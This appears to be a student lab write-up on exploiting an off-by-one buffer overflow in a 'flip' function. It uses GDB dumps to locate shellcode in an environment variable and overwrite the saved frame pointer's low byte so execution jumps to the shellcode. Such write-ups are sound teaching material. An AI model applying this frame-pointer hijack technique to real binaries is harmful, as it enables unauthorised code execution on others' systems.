# Question 4: Vega Write-up
## Main Idea
#### (A description of the vulnerability)
The code is vulnerable because ```flip``` function uses ```<=``` instead of ```<``` which allows us to write n + 1 byte instead of n, overflowing the byte immediately after the ```buf```. Sfp of ```flip``` is right above ```buf``` so we can change the least significant byte of sfp such that it points back to the ```buf``` which we can fill up with the address of shellcode. After sfp reroutes to ```buf```, it will pick up the address of shellcode and executes it.
```
    char buf[64];
    ...
    ...
    for (i = 0; i < n && i <= 64; ++i)
        buf[i] = input[i] ^ 0x20;
```
This is a off-by-one vulnerability.

## Magic Numbers
#### (How any relevant “magic numbers” were determined, usually with GDB)
We first determined the address of our shellcode (0xffffdfaa + 4 = 0xffffdfae) which is located around the top of the stack as an environment variable. We add 4 to it because first four bytes of that environment variable is 'EGG='.
```
(gdb) print ((char **) environ)[4]
$1 = 0xffffdfaa "EGG=j2X̀\211É\301jGX̀1\300Ph//shh/binT[PS\211\341\061Ұ\v̀"
(gdb) x/2wx 0xffffdfaa
0xffffdfaa:     0x3d474745      0xcd58326a
```
We then determine the address of ```buf``` (0xffffd570) and the address of rip of ```invoke``` (0xffffd5b4). Finding the addresses was done through invoking GDB and setting a breakpoint at line 17.
```
(gdb) x/32x buf
0xffffd570:     0x00000000      0x00000001      0x00000000      0xffffd71b
0xffffd580:     0x00000002      0x00000000      0x00000000      0x00000000
0xffffd590:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
0xffffd5a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd5b0:     0xffffd5bc      0x0804927a      0xffffd751      0xffffd5c8
0xffffd5c0:     0x0804929e      0xffffd751      0xffffd650      0x0804946f
0xffffd5d0:     0x00000002      0xffffd644      0xffffd650      0x0804a000
0xffffd5e0:     0x00000000      0x00000000      0x0804944d      0x0804bfe8

(gdb) i f
Stack level 0, frame at 0xffffd5b8:
 eip = 0x8049251 in invoke (flipper.c:17); saved eip = 0x804927a
 called by frame at 0xffffd5c4
 source language c.
 Arglist at 0xffffd5b0, args: in=0xffffd751 "AAAA\216\377\337\337", 'A' <repeats 56 times>, "P"
 Locals at 0xffffd5b0, Previous frame's sp is 0xffffd5b8
 Saved registers:
  ebp at 0xffffd5b0, eip at 0xffffd5b4
```
The sfp of ```invoke``` is located below rip at 0xffffd5b0 with value 0xffffd5bc. To make it point to the start of ```buf```, we have to change the least significant byte bc (0xffffd5bc) to 70 (0xffffd570). Because each byte is xored with 0x20 before overwriting to the ```buf```, 0x50 does the job. 0x20 ^ 0x50 = 0x70

## Exploit Structure
#### (A description of your exploit structure)
This exploit has four parts:
1. Write 4 bytes of garbage to account for sfp popoff.
2. Overwrite the next 4 bytes with the address of shellcode.
3. Write 56 bytes of garbage to pad rest of ```buf```. 
4. Overwrite the least significant byte of the sfp of ```invoke``` to make it point back to ```buf``` (0xffffd570).

## Exploit GDB Output
#### (GDB output demonstrating the before/after of the exploit working)
When we ran GDB after inputting the malicious exploit string, we got the following output:
```
(gdb) x/32x buf
0xffffd570:     0x61616161      0xffffdfae      0x61616161      0x61616161
0xffffd580:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd590:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd5a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd5b0:     0xffffd570      0x0804927a      0xffffd751      0xffffd5c8
0xffffd5c0:     0x0804929e      0xffffd751      0xffffd650      0x0804946f
0xffffd5d0:     0x00000002      0xffffd644      0xffffd650      0x0804a000
0xffffd5e0:     0x00000000      0x00000000      0x0804944d      0x0804bfe8
```
After 4 bytes of garbage, address of shellcode is successfully inserted into the buffer, 56 more bytes of garbage to pad rest of buffer and the sfp of ```invoke``` at 0xffffd5b0 points back to the start of the ```buf``` (0xffffd570) which causes our program to go back to buf, pick up the address of shellcode and start executing it.